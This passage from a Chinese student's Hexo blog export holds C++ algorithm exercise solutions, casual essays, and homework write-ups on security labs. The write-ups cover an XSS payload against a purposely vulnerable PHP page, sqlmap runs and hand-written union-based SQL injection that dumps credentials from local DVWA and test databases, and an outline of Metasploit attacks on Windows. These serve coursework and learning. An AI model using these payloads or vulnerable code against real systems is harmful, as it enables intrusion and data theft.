cout&lt;&lt;ca[local]&lt;&lt;endl; &#125; &#125; 问题 D: 小雏鸟的计算题目描述小雏鸟们的三角形翅膀终于长出健壮的肌肉和丰满的羽毛，已经跃跃欲试的去准备尝试挑战新的难题了。 考虑以下的算法：\1. 输入 n\2. 印出 n\3. 如果 n = 1 结束\4. 如果 n 是奇数 那么 n=3*n+1\5. 否则 n=n/2\6. GOTO 2例如输入 22 得到的数列： 22 11 34 17 52 26 13 40 20 10 5 16 8 4 2 1据推测此算法对任何整数而言会终止 (当打印出 1 的时候)。虽然此算法很简单，但以上的推测是否真实却无法知道。然而对所有的n ( 0 &lt; n &lt; 1000000 )来说，以上的推测已经被验证是正确的。给一个输入 n 透过以上的算法我们可以得到一个数列（1作为结尾）。此数列的长度称为n的cycle length。上面提到的例子 22的 cycle length为 16.问题来了：对任2个整数i，j我们想要知道介于i，j（包含i，j）之间的数所产生的数列中最大的cycle length是多少。 输入输入可能包含了好几行测试数据，每一行有一对整数 i，j 。 0&lt; i，j &lt; 1000000 输出对每一对输入 i j你应该要输出 i j和介于i j之间的数所产生的数列中最大的cycle length。 样例输入123451 1010 1100 200201 210900 1000 样例输出123451 10 2010 1 20100 200 125201 210 89900 1000 174 提示代码123456789101112131415161718192021222324252627282930313233343536373839#include&lt;iostream&gt;using namespace std;int test(int n)&#123; int count=0; while(n!=1) &#123; count++; if(n%2!=0) n=3*n+1; else n=n/2; &#125; count++; return count;&#125;int main()&#123; int i,j; while(cin&gt;&gt;i&gt;&gt;j) &#123; cout&lt;&lt;i&lt;&lt;" "&lt;&lt;j&lt;&lt;" "; int max=0; if(i&gt;j) &#123; int m; m=i; i=j; j=m; &#125; for(int k=i;k&lt;=j;k++) &#123; if(test(k)&gt;max) max=test(k); &#125; cout&lt;&lt;max&lt;&lt;endl; &#125; &#125; 问题 E: 进制转换题目描述输入一个十进制正整数，然后输出它所对应的八进制数。 输入输入一个十进制正整数n(1≤n≤106) 。 输出输出n对应的八进制数，输出在一行。 样例输入110 样例输出112 提示代码123456789101112131415161718192021222324#include&lt;iostream&gt;#include&lt;stack&gt; using namespace std;void transform(int x)&#123; stack &lt;int&gt; stk; while(x!=0) &#123; stk.push(x%8); x=x/8; &#125; while(!stk.empty()) &#123; cout&lt;&lt;stk.top(); stk.pop(); &#125; cout&lt;&lt;endl;&#125;int main()&#123; int n; cin&gt;&gt;n; transform(n);&#125; 问题 F: 排列问题题目描述 输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。 输入单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。 输出打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。 样例输入1abc, 样例输出1abc acb bac bca cab cba 提示代码123456789101112131415161718#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;string&gt;#include&lt;map&gt;#include&lt;algorithm&gt; using namespace std; int main() &#123; string str; cin &gt;&gt; str; str = str.substr(0, str.length() - 1); sort(str.begin(),str.end()); do &#123; cout &lt;&lt; str &lt;&lt;" "; &#125;while(next_permutation(str.begin(),str.end())); return 0; &#125; 问题 G: 快速幂题目描述 输入多组测试样例，最多50组。每组测试样例给定一个整数x(1&lt;=x&lt;=25000) 输出对每个样例，输出一行，代表f(x)对100000007取余的结果。 样例输入123345 样例输出123332893414 提示代码12345678910111213141516171819202122232425262728293031#include&lt;iostream&gt;#include&lt;cmath&gt;using namespace std;long long n=100000007; long long poww(long long a, long long b) &#123; long long ans = 1; while (b) &#123; if (b &amp; 1 != 0) ans=ans*a%n; a=a*a%n; b &gt;&gt;= 1; &#125; return ans;&#125;int main()&#123; long long n=100000007; int x; while(cin&gt;&gt;x) &#123; long long sum=0; for(int i=1;i&lt;=x;i++) &#123; sum+=(poww(i,i)); &#125; cout&lt;&lt;(sum+1)%n&lt;&lt;endl; &#125; return 0;&#125; 问题 H: 求第k小题目描述给定n(1&lt;=n&lt;=1000000)个元素，求第k小数(1&lt;=k&lt;=n)。 输入一组样例。第一行输入两个整数n和k。第二行输入n个不同的int范围内的数。 输出输出一行，输出第k小数。 样例输入125 21 5 3 2 4 样例输出12 提示代码123456789101112131415#include&lt;iostream&gt;#include&lt;algorithm&gt; using namespace std;int a[1000010];int main()&#123; int n,k; cin&gt;&gt;n&gt;&gt;k; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; sort(a,a+n); cout&lt;&lt;a[k-1]&lt;&lt;endl;&#125; 问题 I: 沙子的质量题目描述设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。 输入第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。 输出合并的最小代价。 样例输入1241 3 5 2 样例输出122 提示代码123456789101112131415161718192021222324252627282930313233343536#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int n;int num[305];int f[305][305]; //合并a堆到b堆的最小代价 int main()&#123; cin&gt;&gt;n; memset(f,127/3,sizeof(f)); //初始化为一个较大值，注意memset的用法！ for(int i=1; i&lt;=n; i++) &#123; cin&gt;&gt;num[i]; num[i]+=num[i-1]; f[i][i]=0; &#125; for(int i=2; i&lt;=n; i++) //求1到i堆的最小代价 &#123; for(int j=i-1; j&gt;=1; j--) //求j到i堆的最小代价 &#123; for(int k=j; k&lt;=i; k++) //找到j到i堆的最小代价 &#123; f[j][i]=min(f[j][i],f[j][k]+f[k+1][i]+num[i]-num[j-1]); &#125; &#125; &#125; cout&lt;&lt;f[1][n]; return 0;&#125; 问题 J: 最长公共子序列题目描述一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad” ,顺次选1，3，5个字符就构成子串” cad” ,现给定两个字符串，求它们的最长共公子串。 输入第一行两个字符串用空格分开。两个串的长度均小于2000 。 输出最长子串的长度。 样例输入1abccd aecd 样例输出13 提示代码123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;string.h&gt; using namespace std;int maxx(int a,int b)&#123; if (a&gt;=b) return a; return b; &#125;int main()&#123; string a,b; cin&gt;&gt;a&gt;&gt;b; int n,m,max=0; n=a.size(); m=b.size(); int lcm[n+1][m+1]; for(int i = 0; i &lt;= n; ++i) lcm[i][0] = 0; for(int i = 0; i &lt;= m; ++i) lcm[0][i] = 0; for(int i=1;i&lt;=n;i++) &#123; for(int j=1;j&lt;=m;j++) &#123; if(a[i-1]==b[j-1]) &#123; lcm[i][j]=lcm[i-1][j-1]+1; &#125; else &#123; lcm[i][j]=maxx(lcm[i][j-1],lcm[i-1][j]); &#125; &#125; &#125; cout&lt;&lt;lcm[n][m];&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS攻击简单示例]]></title>
    <url>%2F2019%2F10%2F13%2FXSS%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[xss 建立漏洞页面在www目录下新建xss.php,代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"&gt; &lt;title&gt;xss漏洞简单搭建&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串输出到input里的value属性里&lt;/h6&gt; &lt;form action="" method="get"&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type="text" name="xss_input_value" value="输入"&gt;&lt;br /&gt; &lt;input type='submit'&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php //php防注入和XSS攻击通用过滤//$_GET &amp;&amp; SafeFilter($_GET);function SafeFilter (&amp;$arr) &#123; $ra=Array('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 &#123; $value = addslashes($value); //给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125;&#125; if (isset($_GET['xss_input_value'])) &#123; $s=$_GET['xss_input_value']; echo'&lt;input type="text" value="'.$_GET['xss_input_value'].'"&gt;'; &#125; else&#123; echo '&lt;input type="text" value="输出"&gt;'; &#125; ?&gt; &lt;/center&gt; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 在浏览器输入http://localhost/xss.php/ 进入页面 输入 1"&gt;&lt;img src=1 onerror=alert(/xss/)&gt; 攻击成功 漏洞修补将xss.php中 1//$_GET &amp;&amp; SafeFilter($_GET); 注释去掉 1$_GET &amp;&amp; SafeFilter($_GET); 通过SafeFilter()函数来过滤输入的内容 再输入刚才的内容 注意：建议用ie浏览器打开，关闭ie浏览器的xss过滤器]]></content>
      <categories>
        <category>XSS攻击</category>
      </categories>
      <tags>
        <tag>XSS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[教育部取消毕业前补考的意见(某人的毛概作业)]]></title>
    <url>%2F2019%2F10%2F13%2F%E6%95%99%E8%82%B2%E9%83%A8%E5%8F%96%E6%B6%88%E6%AF%95%E4%B8%9A%E5%89%8D%E8%A1%A5%E8%80%83%E7%9A%84%E6%84%8F%E8%A7%81%2F</url>
    <content type="text"><![CDATA[据教育部10月12日消息，近日，教育部印发了《关于深化本科教育教学改革 全面提高人才培养质量的意见》（以下简称《意见》）。 《意见》要求，要严把考试和毕业出口关。加强考试管理，严肃考试纪律，坚决取消毕业前补考等“清考”行为。加强学生体育课程考核，不能达到《国家学生体质健康标准》合格要求者不能毕业。科学合理制定本科毕业设计（论文）要求，严格全过程管理，严肃处理各类学术不端行为。落实学士学位管理办法，健全学士学位管理制度，严格学士学位标准和授权管理，严把学位授予关。 先从个人观点来说，这件事对自己来说是没有影响的，因为我觉得在大学里成绩门门都上90是不容易的，但是只要按时上课，不经常逃课，上课认真听听，不是一直在玩手机，考试前在突击复习一下，不能保证90+，但是及格还是没有什么大问题的，反而原来有毕业大补考，助长了那些不去上课，懒在宿舍睡觉的人。 从学校，老师的层面来看，这是不太公平的，因为每个学校的教学质量，学术要求都是不一样的，课程难度也是不一样的，必修课通过率可能会很高，专业课甚至挂科率能到达恐怖的50%，而且还有平时分这么玄妙的东西，如果老师的平时分严格按照学生平时表现给（当然不可能），这个《意见》绝对是公平的，而且是必要的。但是大学的分数又很玄妙，老师一般不按学生表现给平时分（因为学生实在太多），一般会用平时作业来代替，这就给了某些人有机可趁，经常去老师那问问题，让老师记住你，老师就可能会给很高的平时分（经常），因为本来老师就不认识几个人。其实这个现象还算好的，因为你至少学了，还获得好处，一下情况是最让人恶心的，亲身经历。 某一《课程》，老师讲的实在太“高深”，我实在听不懂，就跑去了其它班听课，他平时也不点名，他布置的平时作业也认真写了，最后卷面我考了90+，平时分给了70+，原来是他布置网络作业的时候要求没说明白，导致网上导出的成绩很低，这明明是老师的原因，本来这门课可以满绩点，甚至保研的时候多点希望，就这样被老师的不负责给抹掉了。 所以如果每个大学，每个老师，每门课程的成绩认定对每位同学都是公平的话，这篇《意见》我希望马上在每所大学实施，但现阶段对一部分人来说可能是不公平的，相反，大学可能会为了通过率，而减小考核难度，成绩作假等等，而这些我相信并不是《意见》所希望看到的。 再从国家层面来看，教育部就是想做两件事–严格人才分层，高校考核综合化合理化。“严进宽出”的时代要结束。 中国高校肯定算不上“严出”，如今从教育部到各高校都开始重视起来，当然是件好事。 但是，“严出”应该从课程标准上严格，比如教师的PPT不能七八年都用同一套，一些混学分的“水”课该消失就得消失。 另外，国内高校善用“数字指标”管理，很可能强行设置淘汰率，毕竟国内曾有名校每门课控制10%学生不及格的规定。 这是一把“双刃剑”，应谨慎掌握，这意味着大家都努力，也有人会被淘汰。这样绝对化的评价显然有失公平，其负面效应可能影响正面初衷。 千万不能只从毕业率上严格，硬性规定学校要有多少淘汰率，那只是“换汤不换药”。 从世界范围内看，大学本不该是这般“好混”。 从教育规律本身、高等教育所要体现的含金量来说，大学学习无疑需要学生付出相当精力。 但为什么之前很多高校都对学生“心慈手软”了呢？ 因为在现在的高考体制下，中国学生读大学的机会成本太高。学生一旦被退学，就相当于一无所有，只能返回原籍，想再读大学，就要重新参加高考。 所以，大学在把严出口关的同时，对于学习跟不上的学生，应该有制度配套，以免让他们失去接受教育的机会。 总体来看《意见》的出发点是好的，但是目前中国的教育还存在一些矛盾，要想达到《意见》的初衷还需要一段时间去解决，我还是很看好教育部的“严出”措施，因为目前来说本科生已经十分不值钱了。]]></content>
      <categories>
        <category>新闻点评</category>
      </categories>
      <tags>
        <tag>新闻</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用sqlmap注入dvwa]]></title>
    <url>%2F2019%2F10%2F13%2F%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%2F</url>
    <content type="text"><![CDATA[利用sqlmap对dvwa进行注入。 kali自带sqlmap，在主机安装DVWA DVWA的安装： http://www.dvwa.co.uk/ 进入网址，下载zip，解压到www目录下，修改www/DVWA/config/config.inc.php中的数据库密码 浏览器进入localhost/DVWA/输入默认用户名admin,密码password，然后点击页面上的“create/reset database”就可以完成了，将DVWA security改成非impossible 在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可 开始注入url: 1sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" 由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数–batch，来自动填写默认值。 得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php) 用–dbs查看数据库名 1sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" --batch --dbs 得到6个数据库名 用–D xxx查看指定数据库，–tables查看数据库中表信息 1sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" --batch -D dvwa --tables ![__O`CQDEB_3S_A_WIYRY089.png](https://i.loli.net/2019/10/13/3sNWgyEmRpejlhI.png) 得到了数据库dvwa的所有表名 用–T xxx查看指定表，–columns查看表的列信息 1sqlmap -u "http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0" --batch -D dvwa -T users --columns 得到了数据库dvwa中表users的数据信息 注入成功！]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单sql注入环境搭建及注入]]></title>
    <url>%2F2019%2F10%2F12%2F%E7%AE%80%E5%8D%95sql%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[网络安全作业二，sql注入，搭建注入环境并注入，以及修补注入漏洞。（图片显示不了的话，点开链接就能看了） 一、服务器搭建1、安装wampserverwampserver在windows下将Apache+PHP+Mysql 集成,一键操作，比较方便，在此选用是因为重点在sql注入上，而不是服务器的搭建，如果想透彻学习服务器搭建，建议不要使用集成环境，可以自己一个一个装，修改配置，最后将这些连到到一起，一个网站就搭好了。 2、安装后的可能会遇到的问题安装完成后，打开，电脑右下角wampserver的图标应该是绿色的，如果是红色和橙色，那就是有些服务没有开启，在图标上左键查看是哪个服务没有开启。 ![3~_25K4IG`WGJ646US7GU4B.png](https://i.loli.net/2019/10/12/nexdYS84XCuc2hv.png) 花花在安装的时候就是橙色的，原因是之前做的计网实验开启了IIS服务，与apache服务冲突了，所以关掉IIS服务就可以了，具体方法为：计算机——有键——管理——服务，找到IIS关闭即可。如果之前的数据库实验用的不是MySQL，而是SQL sever，则需要将SQL server服务也关闭，方法同上。 3、编写登录页和测试页左键wampserver的小图标，打开www目录，进入，新建两个文件，login.php,test.php。编辑两个文件，代码如下： login.php: 123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;title&gt;网络安全作业二&lt;/title&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;&lt;/head&gt; &lt;body &gt;&lt;form action="test.php" method="post"&gt; &lt;fieldset &gt; &lt;legend&gt;自建sql注入平台&lt;/legend&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type="text" name="username"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密 码：&lt;/td&gt; &lt;td&gt;&lt;input type="text" name="password"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type="submit" value="提交"&gt;&lt;/td&gt; &lt;td&gt;&lt;input type="reset" value="重置"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/fieldset&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; test.php: 12345678910111213141516171819202122232425&lt;?php$pwd=$_POST['password'];$uname=$_POST['username'];//echo "您当前执行的sql语句为：" ;//echo "select * from admin where passward='$pwd' and name='$uname'&lt;br/&gt;";//echo "&lt;hr&gt;";$mysqli = new mysqli('127.0.0.1','root','','sqlin'); if(mysqli_connect_errno())&#123; printf("连接失败:%s&lt;br&gt;",mysqli_connect_error()); exit();&#125;$result = $mysqli-&gt;query("select * from admin where name='$uname'");//print_r($result-&gt;fetch_array(MYSQLI_ASSOC));if($row=mysqli_fetch_row($result))&#123; printf ("%s : %s",$row[0],$row[1]); echo "&lt;br&gt;"; echo "success！";&#125;else&#123; echo "账号或密码错误！";&#125;$mysqli-&gt;close();$result-&gt;close();?&gt; 然后在浏览器上输入http://localhost/login.php，即可进入登陆页面。 不过目前还没有数据库信息，在wampserver小图标左键打开mysql,进入，默认无密码，建立名为sqlin的数据库，和名为admin的表，由于以前做过数据库实验，命令在此不在赘述。 ![_Z47NFQ_K3X`XS_DDT9~9.png](https://i.loli.net/2019/10/12/cC5yGfQdmr3JabB.png) 这样环境就搭好了，可以开始注入了。 二、简单的sql注入判断有几个显示位。输入如下: 12用户名：1' union select 1,2,3#密码：111（任意） 发现报错，显示位不是3，重试 12用户名：1' union select 1,2#密码：111（任意） 显示位为两位 确定表有几列12用户名：1' order by 3#密码：111（任意） 报错，不是3列 12用户名：1' order by 2#密码：111（任意） 表有2列 获取数据库名12用户名：1' union select 1,database() #密码：111（任意） 数据库名为sqlin 获取表名12用户名：1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #密码：111（任意） ![X_7_7ZT1P~YPSMBJY`@_026.png](https://i.loli.net/2019/10/12/eXykOGPu6CRo2cY.png) 表名为admin 获取列名12用户名：0' union select (select column_name from information_schema.columns where table_name='admin' limit 0,1),(select column_name from information_schema.columns where table_name='admin' limit 1,2)#密码：111（任意） 列名为name,passward 获取数据12用户名：1' union select name,passward from admin#密码：111（任意） 得到用户名及密码 （建表的时候把password拼错了）😂 三、注入漏洞修补由于select语句并没有对输入的用户名进行检测，而是拿来直接用，造成的注入漏洞，可以对输入的用户名进行长度限制，或者过滤。]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf攻击windows]]></title>
    <url>%2F2019%2F10%2F11%2Fmsf%E6%94%BB%E5%87%BBwindows%2F</url>
    <content type="text"><![CDATA[利用msf对windows进行渗透攻击。 一、利用ms08_067攻击xp系统在kali终端输入： 1msfconsole 进入metasploit 首先搜索这个漏洞 然后使用模块 查看选项 设置目标IP和自身IP，及被攻击系统版本 直接攻击返回shell 二、利用永恒之蓝（ms17_010）攻击win7首先搜索该漏洞 使用该漏洞模块 设置目标IP和自身IP，目标系统默认 攻击 攻击成功，建立会话 打开绘画，进入shell 三、利用metasploit渗透win10首先通过msfvenom生成木马文件，并放入win10靶机中 然后在kali上开启监听 然后在win10靶机上运行木马程序，监听便能收到，获取shell 攻击完成。 以上三个攻击均拿到了shell便可以在对方机器上设置远程用户，然后就可以通过本机的Windows系统远程登陆被攻击的机器，也可以记录对方的键盘记录，远程关机等等]]></content>
      <categories>
        <category>渗透攻击</category>
      </categories>
      <tags>
        <tag>渗透攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一天是不良人，一辈子都是不良人]]></title>
    <url>%2F2019%2F10%2F11%2F%E4%B8%80%E5%A4%A9%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA%EF%BC%8C%E4%B8%80%E8%BE%88%E5%AD%90%E9%83%BD%E6%98%AF%E4%B8%8D%E8%89%AF%E4%BA%BA%2F</url>
    <content type="text"><![CDATA[不良帅：臣尽力了！ 作者：Apocalypse 这个结局真的很完美，我所说的完美不是指合家欢式的完美，而是逻辑上，剧情上和顺应历史的完美，真的很佩服编剧的想象力和创造力。 根据朱温篡唐称帝，朱友贞即位后梁被灭，还有李存勖称帝的情节，我大致可以得出结论，不良人的动画走势还是会顺应历史事实的，而且李星云这个昭宗第十子确有其人，历史上的确是被老太监救下来，并且改名换姓，叫做胡昌翼，隐居在考水，后来这个地方成为了明经胡氏的发源地，而这个活下来的皇子也就成了胡氏先祖，被称作明经胡公，是胡适，胡雪岩等人的先祖。 那么根据历史，李星云最终肯定是无法称帝的，最后继承后唐之位的是李嗣源，肯定也是他拿走了传国玉玺，历史上的由和氏璧雕琢而成的，代表皇权正统，自秦传下的传国玉玺就是在后唐末帝李从珂手中丢失的。同时由少数民族建立的政权契丹，首领也是剧中出现过的耶律阿保机。所以无论如何，李星云不可能继承大统，所以之前我猜测的结局是他将不良帅引入，并最终二人同归于尽，亦或者合众人之力将不良帅灭尽，并最终归隐山林（符合史实）。无论是哪种我臆想的结局，都把不良帅当作了最后的反派，而上一集的预告也预示着不良帅的反叛。可谁成想，最终为了大唐国运而牺牲自己的，却是他。从敬新磨说出不良帅必死的卦象后，我就猜测到了不良帅的死，但从未想过是以一种忠诚，以一种近乎献祭的方式，告别了这个他存在了300多年的世界。虽然无数种卦象都表明，李星云不可能称帝，但是不良帅近乎偏执的心理，硬是花费了几十年的布局，最终以自己的死为句号，终究是打开了一丝李星云去逐鹿天下的可能。怎么说呢，其实从第一季到第三季39集，我都一直不是很认可这个角色，毕竟他所展现出来的强大实力和飞扬跋扈，就像古代傀儡皇帝身边的权臣一般，让人感觉很不舒服。但是最终，通过这一季，我终于理解这个角色存在的意义和其身上的矛盾了。作为一个能够以一己之力影响数十年局势的人，想要扶植任何一个人登上帝位或者自己登上帝位，都是不费吹灰之力的事情，可是不良帅哪怕是活了300年，心里还是那份对大唐的愚忠。本来我还在怀疑，是因为当初和李淳风关于卦象和大唐气运的争执，才导致他这个好胜且偏执的人一直坚持到现在，只为了和李淳风，或者说天命一争高下。但在他饱含深情的对大唐诸帝一一告别时，我能感受到，袁天罡已经把自己的命运，自己的一切，都和大唐联系起来了。 其实在几十年前布局时，甚至一百多年前构思布局时，亦或者在300年前，他得出卦象之时，就已经确定了他的死期。有一种执着，叫做明知自己已经定格的命运，却还要试图去为大唐做些什么；明知大唐早已衰败，却竭尽全力为国运再续多年；明知达成自己最终的目的希望渺茫，甚至概率为万分之一，也不惜一试，哪怕徒劳地献出自己的一切。他为大唐所献出的，已经完全不止一条命了，而是一个人所拥有的全部，所能够献出的一切。他可以为了保全大唐逆天而行，在世上苟活数百年，尝尽一切人间冷暖；可以为了大唐面容全毁，感官丧失；可以为了大唐而精心布局，用自己必死换得一丝可能，甚至……..不良帅早就知道，大唐的命运已经终结，而自己所做的，无非是用自己的一切，去偿还先帝们的恩情罢了。 对于天下的所有人，他是恐惧和残忍的化身，可对于大唐帝位上的诸宗，他就是千古忠臣，忠于皇室，忠于江山，忠于大唐，甚至，比之众位帝王，他才是大唐的化身。从未僭越，恪守信条，愚忠入骨 我愿於天穷，琅邪倾侧左。 虽欲竭忠诚，欣公归其楚。 快人由为叹，抱情不得叙。 显行天教人，谁知莫不绪。 我愿何时随，此叹亦难处。 今我将何照於光曜，释衔不如雨。 “臣尽力了” 作者：DXBofDream 世间万事，风云变幻，苍黄翻覆，纵使波橘云诡， 但制心一处，便无事不办。 天定胜人，人定兮胜天。 依山傍水房树间，行也安然，坐也安然； 一头耕牛半顷田，收也凭天，荒也凭天。 雨过天晴驾小船，鱼在一边，酒在一边； 路逢骚客问诗篇，好也几言，歹也几言。 布衣得暖胜丝棉，新也可穿，旧也可穿。 粗茶淡饭饱三餐，早也香甜，晚也香甜； 闲暇无事鉴书篇，名也不贪，利也不贪。 夜归挚友话灯前，今也谈谈，古也谈谈； 一觉睡到日三竿，不是神仙，胜似神仙。]]></content>
      <categories>
        <category>生活日常</category>
      </categories>
      <tags>
        <tag>动漫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F10%2F10%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
</search>
